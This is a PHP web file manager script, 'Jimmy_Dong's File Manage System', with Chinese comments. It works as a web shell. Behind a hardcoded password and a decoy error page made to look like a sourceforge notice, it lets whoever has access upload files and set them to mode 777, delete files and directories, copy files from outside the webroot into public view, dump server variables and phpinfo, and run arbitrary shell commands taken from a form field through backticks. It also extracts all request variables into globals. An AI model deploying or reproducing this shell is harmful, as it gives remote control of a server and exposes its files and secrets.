<? 
/////////////////////////////////////////////////////////////////////////////////// 
// 
// Access File Over Http 
// 
// by jimmy 2004-07-23 
// update by jimmy 2003.11.05
// update by jimmy 2004.12.15
// 
/////////////////////////////////////////////////////////////////////////////////// 
/*
        header ("Expires: Mon, 26 Jul 1997 05:00:00 GMT");    // Date in the past 
        header ("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");// always modified 
        header ("Cache-Control: no-cache, must-revalidate");  // HTTP/1.1 
        header ("Pragma: no-cache");                          // HTTP/1.0 
*/
error_reporting(7);

// 处理变量 registerglobals=off
if ( function_exists('ini_get') ) {
	$onoff = ini_get('register_globals');
} else {
	$onoff = get_cfg_var('register_globals');
}
if ($onoff != 1) {
	@extract($_SERVER, EXTR_SKIP);
	@extract($_COOKIE, EXTR_SKIP);
	@extract($_FILES, EXTR_SKIP);
	@extract($_POST, EXTR_SKIP);
	@extract($_GET, EXTR_SKIP);
	@extract($_ENV, EXTR_SKIP);
}

// 处理变量 magic_quotes=off
function stripslashesarray (&$arr) {
  while (list($key,$val)=each($arr)) {
    if ($key!="templatesused" and $key!="argc" and $key!="argv") {
			if (is_string($val) AND (strtoupper($key)!=$key OR ("".intval($key)=="$key"))) {
				$arr["$key"] = stripslashes($val);
			} else if (is_array($val) AND ($key == 'HTTP_POST_VARS' OR $key == 'HTTP_GET_VARS' OR strtoupper($key)!=$key)) {
				$arr["$key"] = stripslashesarray($val);
			}
	  }
  }
  return $arr;
}
if (get_magic_quotes_gpc() and is_array($GLOBALS)) {
  if (isset($attachment)) {
    $GLOBALS['attachment'] = addslashes($GLOBALS['attachment']);
  }
  if (isset($avatarfile)) {
    $GLOBALS['avatarfile'] = addslashes($GLOBALS['avatarfile']);
  }
  $GLOBALS = stripslashesarray($GLOBALS);
}
set_magic_quotes_runtime(0);

// 全局变量定义
$www_root   =   $HTTP_SERVER_VARS['DOCUMENT_ROOT'];                 //site root
$www_URL    =   "http://".$HTTP_SERVER_VARS['SERVER_ADDR'];         //without '/' at the end. 
$localfile  =   $HTTP_SERVER_VARS['PHP_SELF'];                      //this file's name 
$home_path  =   dirname(str_replace("\\\\","\\",$HTTP_SERVER_VARS["PATH_TRANSLATED"]));  //without '/' at the end. 
$home_URL   =   "http://".$HTTP_SERVER_VARS['SERVER_NAME'].dirname($HTTP_SERVER_VARS['PHP_SELF']);                                             //without '/' at the end. 
$admin_passwd=  "zhimakaimen";                                      //Admin password
$debug      =   0;
clearstatcache(void); 
session_start(); 
session_register("session_permission"); 
session_register("current_path");
session_register("order");
if (empty($orderbyname)) $orderbyname=$order;
else $order=$orderbyname;


if (empty($current_path) || $current_path=='.' || !file_exists($current_path))$current_path=getcwd(); 
chdir($current_path);
if (substr($current_path,0,strlen($www_root))==$www_root)
    $current_URL=str_replace($www_root,$www_URL,$current_path);
else 
    $current_URL='N/A';
    
if($_REQUEST['jd']!=1 && (empty($session_permission) || ($session_permission!="$admin_passwd"))) { echo "<br>ERROR<br>---------<br>  Error request, please refrence to the manul. Get the recently version from <a href=http://sourceforge.net/projects/phpdocu/>here</a>.<br><br>LICENSING<br>---------<br>  This program and all associated files are released under the GNU Public<br>  License, see COPYING for details.<br>";exit;}

?> 
<html> 

<head> 
<META HTTP-EQUIV="Expires" CONTENT="0"> 
<META HTTP-EQUIV="Last-Modified" CONTENT="0"> 
<META HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate"> 
<META HTTP-EQUIV="Pragma" CONTENT="no-cache"> 
<meta http-equiv="Content-Type" content="text/html; charset=gb2312"> 
<title>Sites of JDS [Jimmy_Dong's Works]</title> 
<STYLE> 
BODY { BORDER-RIGHT: medium none; PADDING-RIGHT: 1px; BORDER-TOP: medium none; PADDING-LEFT: 1px; FONT-SIZE: 7.5pt; BACKGROUND: #eeeeee fixed; PADDING-BOTTOM: 1px; MARGIN: 0px; BORDER-LEFT: medium none; COLOR: #444444; PADDING-TOP: 1px; BORDER-BOTTOM: medium none; FONT-FAMILY: verdana; TEXT-ALIGN: justify; TEXT-DECORATION: none } 
TABLE { BORDER-RIGHT: medium none; PADDING-RIGHT: 1px; BORDER-TOP: medium none; PADDING-LEFT: 1px; FONT-SIZE: 7.5pt; BACKGROUND: #eeeeee fixed; PADDING-BOTTOM: 1px; MARGIN: 0px; BORDER-LEFT: medium none; COLOR: #444444; PADDING-TOP: 1px; BORDER-BOTTOM: medium none; FONT-FAMILY: verdana; TEXT-ALIGN: justify; TEXT-DECORATION: none } 
TR { BORDER-RIGHT: medium none; PADDING-RIGHT: 1px; BORDER-TOP: medium none; PADDING-LEFT: 1px; FONT-SIZE: 7.5pt; BACKGROUND: #FFFFFF fixed; PADDING-BOTTOM: 1px; MARGIN: 0px; BORDER-LEFT: medium none; COLOR: #444444; PADDING-TOP: 1px; BORDER-BOTTOM: medium none; FONT-FAMILY: verdana; TEXT-ALIGN: justify; TEXT-DECORATION: none } 
TD { BORDER-RIGHT: medium none; PADDING-RIGHT: 1px; BORDER-TOP: medium none; PADDING-LEFT: 1px; FONT-SIZE: 7.5pt; BACKGROUND: #FFFFFF fixed; PADDING-BOTTOM: 1px; MARGIN: 0px; BORDER-LEFT: medium none; COLOR: #444444; PADDING-TOP: 1px; BORDER-BOTTOM: medium none; FONT-FAMILY: verdana; TEXT-ALIGN: justify; TEXT-DECORATION: none } 
P { BORDER-RIGHT: medium none; PADDING-RIGHT: 1px; BORDER-TOP: medium none; PADDING-LEFT: 1px; FONT-SIZE: 7.5pt; BACKGROUND: #eeeeee fixed; PADDING-BOTTOM: 1px; MARGIN: 0px; BORDER-LEFT: medium none; COLOR: #444444; PADDING-TOP: 1px; BORDER-BOTTOM: medium none; FONT-FAMILY: verdana; TEXT-ALIGN: justify; TEXT-DECORATION: none } 
IFRAME { BORDER-RIGHT: medium none; PADDING-RIGHT: 1px; BORDER-TOP: medium none; PADDING-LEFT: 1px; FONT-SIZE: 7.5pt; BACKGROUND: #000000 fixed; PADDING-BOTTOM: 1px; MARGIN: 0px; BORDER-LEFT: medium none; COLOR: #AAAAAA; PADDING-TOP: 1px; BORDER-BOTTOM: medium none; FONT-FAMILY: verdana; TEXT-ALIGN: justify; TEXT-DECORATION: none; SCROLLBAR-FACE-COLOR: #000000; SCROLLBAR-HIGHLIGHT-COLOR: #ff8000; SCROLLBAR-SHADOW-COLOR: #ff8000; SCROLLBAR-3DLIGHT-COLOR: #000000; SCROLLBAR-ARROW-COLOR: #ff8000; SCROLLBAR-TRACK-COLOR: #000000; SCROLLBAR-DARKSHADOW-COLOR: #000000 } 
B { FONT-WEIGHT: bold } 
EM { COLOR: #cccccc; FONT-STYLE: normal } 
TT { FONT-FAMILY: courier new } 
A { COLOR: #444444; TEXT-DECORATION: none } 
A:hover { COLOR: #ff8000 } 
.fineprint { FONT-WEIGHT: normal; FONT-SIZE: 7pt; COLOR: #808080 } 
.formctl { BORDER-RIGHT: #ff8000 1px solid; BORDER-TOP: #ff8000 1px solid; FONT-SIZE: 7.5pt; BORDER-LEFT: #ff8000 1px solid; COLOR: #ff8000; BORDER-BOTTOM: #ff8000 1px solid; FONT-FAMILY: verdana; BACKGROUND-COLOR: #000000 }
.input { font-size: 12px; border: 1px solid; clip: rect(1px)} 
.button     { font-size: 12px; border: 1px solid; clip: rect(1px);BACKGROUND-COLOR: #FEFEFE;COLOR: #000022;} 
.buttonover { font-size: 12px; border: 1px solid; clip: rect(1px);BACKGROUND-COLOR: #E0E0E0;COLOR: #FF0022; cursor: hand;} 
.buttondown { font-size: 12px; border: 1px solid; clip: rect(1px);BACKGROUND-COLOR: #CECECE;COLOR: #FF0022;} 
.list { FONT-WEIGHT: bold; VERTICAL-ALIGN: bottom; COLOR: #444444; BORDER-BOTTOM: #404040 1px solid; HEIGHT: 14pt;}
.tdname { VERTICAL-ALIGN: middle; WIDTH: 25%; TEXT-ALIGN: right } 
.tdtext { VERTICAL-ALIGN: middle; TEXT-ALIGN: left } 
.tderr { PADDING-RIGHT: 0px; BORDER-TOP: #ff8000 1px solid; PADDING-LEFT: 0px; FONT-WEIGHT: bold; FONT-SIZE: 8pt; PADDING-BOTTOM: 4pt; VERTICAL-ALIGN: middle; COLOR: #444444; PADDING-TOP: 4pt; BORDER-BOTTOM: #ff8000 1px solid } 
</STYLE> 

</head> 

<body> 
<? 
//安全验证
if (empty($session_permission) || ($session_permission!="$admin_passwd")) 
{ 
    echo $session_permission; 
    session_unregister("session_permission"); 
    $session_permission=""; 
    ?> 
    <form name=form1 method=post action="#">
    <input type=hidden name=jd value=1>
    a test form. <input type=password size=20 name=session_permission value=""> 
    <input type=submit value="test"> 
    </form> 
    <? 
    exit; 
} 
//处理用户行为
switch ($actid) 
{ 
    case "delete": 
        if (file_exists("./$file_name")) 
        { 
            if (unlink("./$file_name"))echo "SysMsg: $file_name has been deleted.<br>\n"; 
            else echo "SysMsg: $file_name can not be delete.<br>\n"; 
            ; 
        } 
        else 
        { 
            echo "SysMsg: $file_name not found.<br>\n"; 
        } 
        break; 
    case "rename": 
        break; 
    case "upload": 
        if (file_exists("./$the_file_name")) 
        { 
            $newfile="__RE".rand(100000,999999)."__".$the_file_name;
            if (copy("./$the_file_name","./$newfile"))
                echo "SysMsg: exists samename file, backup as $newfile. Remember to clean it!<br>\n"; 
            unlink("./$the_file_name");
        } 
        if (copy($the_file,"./$the_file_name")) 
        { 
            chmod($the_file_name,0777); 
            echo "SysMsg: $the_file_name upload done!<br>\n"; 
        } 
        break; 
    case "show": 
            $newfile="__RE".rand(100000,999999)."__".$file_name."s";
        copy("$file_name","$home_path/$newfile"); 
        echo "SysMsg: show $file_name 's source code<br>\n"; 
        echo "<script language=javascript>alert('Do Remember to delete the tmp file: $newfile');document.URL='{$home_URL}/{$newfile}';</script>"; 
        break; 
    case "download": 
        if ( substr($current_path,0,strlen($www_root))==$www_root )
        {
            echo "SysMsg: show $file_name<br>\n"; 
            echo "<script language=javascript>document.URL='{$current_URL}/{$file_name}';</script>"; 
        }else
        {
            $newfile="__RE".rand(100000,999999)."__".$file_name;
            copy("$file_name","$home_path/$newfile");
            echo "SysMsg: $file_name isn't in webroot, copy it to $home_path/$newfile<br>\n";
            echo "<script language=javascript>alert('Do Remember to delete the tmp file: $newfile');document.URL='{$home_URL}/{$newfile}';</script>";
        }
        break; 
    case "lock": 
        if ( @rename("./index.php","index.bak") ) 
        { 
            echo "SysMsg: unlocked!<br>\n"; 
        } 
        elseif (@rename("./index.bak","index.php")) 
        {
            echo "SysMsg: locked!<br>\n"; 
        }
        break; 
    case "cd": 
        if ($dir_name=="..") 
        { 
            if (chdir(dirname($current_path)))
            {
                $current_path=dirname($current_path); 
                echo "SysMsg: Chanage dir to $dir_name<br>\n"; 
            }
            else echo "Error! Can not change to $dir_name<br>\n"; 
        } 
        elseif (substr($dir_name,0,1)=='/')
        {
            if (chdir("$dir_name"))
            {
                $current_path="$dir_name"; 
                echo "SysMsg: Chanage dir to $dir_name<br>\n"; 
            }
            else echo "Error! Can not change to $dir_name<br>\n"; 
        } 
        else
        {
            if ($current_path=='/') $current_path='';
            if (chdir("$current_path/$dir_name"))
            {
                $current_path="$current_path/$dir_name"; 
                echo "SysMsg: Chanage dir to $dir_name<br>\n"; 
            }
            else echo "Error! Can not change to $dir_name<br>\n"; 
        }
        if (substr($current_path,0,strlen($www_root))==$www_root)
            $current_URL=str_replace($www_root,$www_URL,$current_path);
        else 
            $current_URL='N/A';
        break; 
    case "rmdir": 
        if (rmdir("$current_path/$dir_name")) echo "SysMsg: Remove dir $dir_name<br>\n"; 
        break; 
    case "mkdir": 
        if (mkdir("$dir_name",0777)) echo "SysMsg: Make new dir $dir_name<br>\n"; 
        break; 
    case "chmod": 
        if (chmod("$current_path/$file_name",0777)) echo "SysMsg: Chmod 777 $file_name<br>\n"; 
        break; 
    case "info":
        echo "列出所有HTTP_SERVER_VARS参数:<br>"; 
        while ( list( $key, $val ) = each( $HTTP_SERVER_VARS ) ) { 
          echo "$key => $val<br>"; 
        }
        echo "<br>localfile = $localfile";
        echo "<br>root_path = $home_path";
        echo "<br>www_URL = $www_URL";
        echo "<hr>";
        phpinfo(); 
        exit; 
    case "refresh":
        echo "SysMsg: Refresh current dir - $dir_name<br>\n";
        break;
    case "cmd":
        $output = `cd $dir_name;$cmd`;
        echo "SysMsg: Run user cmd - $cmd<br> Result: <pre>$output</pre><br>\n";
        break;
    default: 
        break; 
} 

if($debug==1)
{
    //--debug------------------------
    echo "<hr>";
    echo "www_root: $www_root <br>";
    echo "www_URL: $www_URL <br>";
    echo "localfile: $localfile <br>";
    echo "home_path: $home_path <br>";
    echo "home_URL: $home_URL <br>";
    echo "current_path: $current_path <br>";
    echo "current_URL: $current_URL <br>";
    echo "orderbyname: $orderbyname <br>";
    echo "<hr>";
    //--end--------------------------
}
?> 

<p><center> 
<table cellspacing=0  style="width: 50%; margin: 8px; border-collapse:collapse" bordercolor="#111111" cellpadding="0"><tr><td style="position: relative; left: 8px; width: 15%; color: #444444; border: 1px solid #9c9c9c; background-color: #9c9c9c; padding-left: 8px; padding-right: 8px; z-index: 1;" nowrap><center> 
<font face="黑体" size="4">声明</font></center></td><td width="*">　</td></tr><tr><td colspan=2 style="position: relative; top: -7pt; border: 1px solid #9c9c9c; padding: 8px; padding-top: 11pt;"> 

<font size="2">&nbsp;&nbsp;&nbsp; <font color=red>请勿使用</font>『Backspace』(返回)功能，<font color=red>请勿使用</font>『F5』(刷新)功能，否则可能会产生不可料后果。删除与覆盖不进行备份，请谨慎操作。</font><p> 
<p><font size="2">&nbsp;&nbsp;&nbsp; 本工具由jimmy_dong@CCF因私人用途而编写。欢迎免费使用，不承担任何因此而产生的后果。改写加入更多功能，请保留本版权信息。谢谢！</font></p> 
<p> 

</td></tr></table> 

<script language="javascript"> 
function delete_check(file_name) 
{ 
    if (confirm("Are you sure to del "+file_name+"?")) document.URL="<?echo $localfile?>?actid=delete&file_name="+file_name; 
} 
function rmdir_check(dir_name) 
{ 
    if (confirm("Are you sure to rmdir "+dir_name+"?")) document.URL="<?echo $localfile?>?actid=rmdir&dir_name="+dir_name; 
} 
</script> 

<TABLE style="WIDTH: 50%"> 
  <TBODY> 
  <TR> 
    <TD class=list colspan=2 align=center>[ <font face="Verdana" size="6" color="#444444">J</font>immy_<font face="Verdana" size="6" color="#444444">D</font>ong's  <font face="Verdana" size="6" color="#444444">F</font>ile <font face="Verdana" size="6" color="#444444">M</font>anage System 1.1] </TD></TR> 
  <tr> 
    <TD style="HEIGHT: 32pt" colspan=2><p><font size=2>说明</font></p> 
    <? 
/*    if (file_exists("readme.txt")) 
    { 
        $temp = file ("readme.txt"); 
        if (!empty($temp)) 
        { 
            reset($temp); 
            $lines=0; 
            do 
            { 
                $lines++; 
                echo "<p><font size=2>&nbsp;&nbsp;&nbsp;&nbsp;".current($temp)." </font></p>"; 
            }while( next($temp)); 
        } 
        else 
        { 
            echo "<p><font size=2>&nbsp;&nbsp;&nbsp;&nbsp;没有说明。</font></p>"; 
        } 
    } 
    else 
    { 
        echo "<p><font size=2>&nbsp;&nbsp;&nbsp;&nbsp;没有说明。</font></p>"; 
    } 
*/   
    echo "当前目录： $current_path &nbsp;&nbsp;&nbsp;&nbsp; | ";
    if ($orderbyname!=1) echo " <a href=$localfile?orderbyname=1>名称排序</a>  ^<b>时间排序</b> ";
    else echo " ^<b>名称排序</b> <a href=$localfile?orderbyname=2>时间排序</a> ";
    echo " | &nbsp;&nbsp; <a href=$localfile?actid=cd&dir_name=$home_path/>bACKtohoMe</a>";
    echo " | &nbsp;&nbsp; <a href=$localfile?actid=refresh&dir_name=$home_path/>REfreSHe</a>";
    ?> 
    </TD> 
  </tr> 
<? 
//获取目录信息
$mydir = dir("."); 
$fileinfo=array();
while($file_name=$mydir->read()) {
    $file_state=stat($file_name);
    $fileinfo[$file_name]=array("file_state"=>$file_state,"file_time"=>date("Y-m-d H-i-s",$file_state[10]),"file_size"=>intval($file_state[7]/1000),"is_dir"=>is_dir($file_name));
}
if ($orderbyname==1)ksort($fileinfo);
reset($fileinfo);
while(list($file_name,$val)=each($fileinfo))
{
    if ($file_name!="index.php" && $file_name!="readme.txt" && $file_name!="." && $file_name!=basename($localfile)) 
    { 
        if ($current_path=="/" && $file_name=="..") continue; 
        $file_state=$val['file_state']; 
        $file_time=$val['file_time']; 
        $file_size=$val['file_size']; 
        if ($val['is_dir']) //目录 
        { 
          if ($file_name=="..")
          {
            ?>
          <TR> 
            <TD class=list noWrap align=left><A href="<?echo $localfile?>?actid=cd&dir_name=<?echo $file_name?>">［<?echo $file_name;?>］</A>  </TD> 
            <TD align=right class=list noWrap> &nbsp; </td></TR> 
          <TR> 
            <TD sytle="color: #444444;"><FONT color=#444444> << 返回上级目录 <font> </TD> 
            <TD sytle="color: #444444;"> &nbsp; </TD></TR> 
            
            <?
          }
          else
          { 
            ?>
          <TR> 
            <TD class=list noWrap align=left><A href="<?echo $localfile?>?actid=cd&dir_name=<?echo $file_name?>">［<?echo $file_name;?>］</A>  </TD> 
            <TD align=right class=list noWrap><img src='folder'></td></TR> 
          <TR> 
            <TD sytle="color: #444444;"><FONT color=#444444> :: update on</FONT> <?echo $file_time;?> | <FONT color=#444444> MODE</FONT> <?printf("%o",$file_state[2]-16384);?> </TD> 
            <TD sytle="color: #444444;"><FONT color=#444444> <a href="javascript: rmdir_check('<?echo $file_name?>');" title="删除当前项目">(X)</a> 
            <a href="<?echo $localfile?>?actid=chmod&file_name=<?echo $file_name;?>" title="修改属性为777">(M)</a></FONT> </TD></TR> 
            <?
          }
          ?>
          <TR> 
            <TD style="HEIGHT: 10pt" colspan=2>　</TD></TR> 
        <? 
        } 
        else //一般文件 
        { 
            continue; 
        } 
    } 
} 
reset($fileinfo);
while(list($file_name,$val)=each($fileinfo))
{
    if ($file_name!="index.php" && $file_name!="readme.txt" && $file_name!="." && $file_name!=basename($localfile)) 
    { 
        if ($current_path=="/" && $file_name=="..") continue; 
        $file_state=$val['file_state']; 
        $file_time=$val['file_time']; 
        $file_size=$val['file_size']; 
        if ($val['is_dir']) //目录 
        { 
            continue; 
        }
        else //一般文件 
        { 
        ?> 
          <TR> 
            <TD class=list noWrap align=left>＊ <A href="<?if (substr($file_name,-4,4)==".php")echo "$localfile?actid=show&file_name=$file_name";else echo "$localfile?actid=download&file_name=$file_name";?>" target="_blank"><?echo $file_name;?></A> </TD> 
            <TD align=right class=list noWrap><?if (is_dir($file_name))echo "<img src='folder.gif'>";else echo $file_size."k";?></td></TR> 
          <TR> 
            <TD sytle="color: #444444;"><FONT color=#444444> :: update on</FONT> <?echo $file_time;?> | <FONT color=#444444> mode</FONT> <?printf("%o",$file_state[2]-32768);?></TD> 
            <TD sytle="color: #444444;"><FONT color=#444444> <a href="javascript: delete_check('<?echo $file_name?>');" title="删除当前项目">(X)</a></FONT> 
            <a href="<?echo $localfile?>?actid=chmod&file_name=<?echo $file_name;?>" title="修改属性为777">(M)</a></TD></TR> 
          <TR> 
            <TD style="HEIGHT: 10pt" colspan=2>　</TD></TR> 
        <? 
        } 
    } 
} 
$mydir->close(); 

print <<< end_of_print
  <TR> 
    <TD class=list colspan=2 align=right>&nbsp; 
      <FONT color=#ff8000>That's all.</FONT> &nbsp;&nbsp; </TD></TR> 
  <TR> 
    <TD style="HEIGHT: 10pt" colspan=2>&nbsp;&nbsp;　</TD></TR></TBODY></TABLE> 
<p>　</p> 
<script language="javascript"> 
function upload_check() 
{ 
    if (form2.the_file.value=="") 
    { 
        alert("Plz Select a File First!"); 
        return false; 
    } 
    form2.actid.value="upload"; 
    form2.submit(); 
} 
function mkdir_check() 
{ 
    if (form2.dir_name.value=="") 
    { 
        alert("Plz Input a Dir name First!"); 
        return false; 
    } 
    form2.actid.value="mkdir"; 
    form2.submit(); 
} 
function cmd_check() 
{ 
    if (form2.cmd.value=="") 
    { 
        alert("Plz Input a Dir name First!"); 
        return false; 
    } 
    form2.actid.value="cmd"; 
    form2.submit(); 
} 

</script> 
<form name=form2 ENCTYPE="multipart/form-data" ACTION="#" METHOD="POST" > 
<input type=hidden name=actid value=""> 
        <p style="text-align: center"><input class=input type="file" name="the_file" size="20"> &nbsp;&nbsp;<input class=button onmouseover="this.className='buttonover';" onmouseout="this.className='button';" onmousedown="this.className='buttondown';" onmouseup="this.className='button';" type=button onclick="upload_check();" name=upload value="upload..."> 
        <p style="text-align: center"><input class=input type="text" name="cmd" size="20"> <input class=button onmouseover="this.className='buttonover';" onmouseout="this.className='button';" onmousedown="this.className='buttondown';" onmouseup="this.className='button';" type=button onclick="cmd_check();" name=runcmd value="run cmd"> 
        <a href=$localfile?actid=cd&dir_name=$home_path/>hoMe</a>|<a href=$localfile?actid=refresh&dir_name=$home_path/>REfreSHe</a>
        <p style="text-align: center"><input class=input type="text" name="dir_name" size="20"> <input class=button onmouseover="this.className='buttonover';" onmouseout="this.className='button';" onmousedown="this.className='buttondown';" onmouseup="this.className='button';" type=button onclick="mkdir_check();" name=mkdir value="mkdir"> 
        &nbsp;&nbsp;<input class=button onmouseover="this.className='buttonover';" onmouseout="this.className='button';" onmousedown="this.className='buttondown';" onmouseup="this.className='button';" type=button onclick="document.URL='<?echo $local_file?>?actid=lock';" name=b1 value="lock/unlock"></p> 
</form> 

end_of_print;
?>

<p>　</p> 
<p style="text-align: center">　</p> 
<p style="text-align: center">About me:</p> 
<p style="text-align: center">&nbsp;Jimmy_Dong of CCF. Welcome to the best forum: 
<a href="http://www.classiclub.com">www.classiclub.com</a> or <a href="http://bbs.et8.net">bbs.et8.net</a></p> 
<p style="text-align: center">Mailtome: <a href="mailto:jimmy_dong@sina.com"> 
Jimmy_Dong@sina.com</a> | Recommend the title likes this: [about JDfm] your 
title.</p> 
<p>　</p> 
<p style="text-align: center"> 
      <FONT color=#ff8000>CopyRight &copy; to Jimmy_Dong of CCF, 
    1999-2003.</FONT>&nbsp;</p> 
     
     

</body> 

</html> 
